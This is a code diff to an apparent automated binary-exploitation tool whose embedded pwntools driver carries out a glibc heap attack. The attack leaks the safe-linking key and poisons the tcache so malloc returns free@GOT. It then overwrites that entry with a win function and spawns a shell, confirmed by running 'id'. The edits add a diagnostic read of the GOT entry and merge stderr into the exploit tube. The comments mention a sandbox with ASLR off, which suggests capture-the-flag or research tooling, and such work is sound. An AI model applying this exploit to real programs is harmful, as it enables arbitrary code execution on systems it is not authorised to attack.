@@ -57,6 +57,7 @@ def autoheap(binary: str) -> dict:
 # poisoning then uses fd = key ^ target. Runs in the binoracle-pwn sandbox (ASLR off).
 _HEAP_SHELL_DRIVER = r'''
 import sys
+from subprocess import STDOUT
 from pwn import *
 elf = ELF(sys.argv[1], checksec=False); context.binary = elf; context.log_level = "error"
 # Fail FAST: if a glibc abort kills the process mid-poison, the next sendlineafter("> ") would
@@ -75,7 +76,7 @@ def choose(io, c, idx=None, data=None):
     if data is not None:
         io.send(data)
 try:
-    io = process([elf.path], aslr=False)
+    io = process([elf.path], aslr=False, stderr=STDOUT)   # merge glibc aborts into the tube
     # Phase A -- leak the safe-linking key: new(0); free(0) (empty bin -> fd=mangle(NULL));
     # show(0) returns (&0 >> 12); then take chunk 0 back so the bin is empty again.
     choose(io, 1, 0); choose(io, 2, 0)
@@ -94,16 +95,17 @@ try:
         stage = "poisoned"; dbg += drain()
         choose(io, 1, 2); stage = "malloc1"; dbg += drain()         # malloc -> chunk 0
         choose(io, 1, 3); stage = "malloc2"; dbg += drain()         # malloc -> free@GOT
-        choose(io, 3, 3, p64(win)); stage = "wrote_win"; dbg += drain()   # *free@GOT = win (8 bytes)
-        # DIAG: read chunks[3][:8] back. If == win, the arbitrary write landed on free@GOT (so the
-        # poison worked and the failure is the free->win jump); if not, malloc2 did not yield free@GOT.
-        wrote = 0
+        # DIAG (decisive): read chunks[3][:8] BEFORE overwriting. If the poison landed, chunks[3]
+        # IS free@GOT, whose current value is the real libc `free` (a 0x7f... pointer); a small or
+        # zero value means malloc2 did NOT return free@GOT, so the poison missed the target.
+        pre = 0
         try:
-            choose(io, 4, 3); wrote = u64(io.recv(8).ljust(8, b"\x00"))
+            choose(io, 4, 3); pre = u64(io.recv(8).ljust(8, b"\x00"))
         except Exception:
             pass
+        choose(io, 3, 3, p64(win)); stage = "wrote_win"; dbg += drain()   # *free@GOT = win (8 bytes)
         io.sendlineafter(PROMPT, b"2"); io.sendline(b"2")           # free(2) -> free@GOT -> win()
-        stage = "triggered"; dbg += b" wrote_back=%#x " % wrote; dbg += io.recvrepeat(1.5)
+        stage = "triggered"; dbg += b" free_ptr_pre=%#x " % pre; dbg += io.recvrepeat(1.5)
         io.sendline(b"echo BINORACLE_PWNED; id"); dbg += io.recvrepeat(1.5)
     except Exception as e:
         dbg += ("[EOF@%s:%r]" % (stage, str(e))).encode()
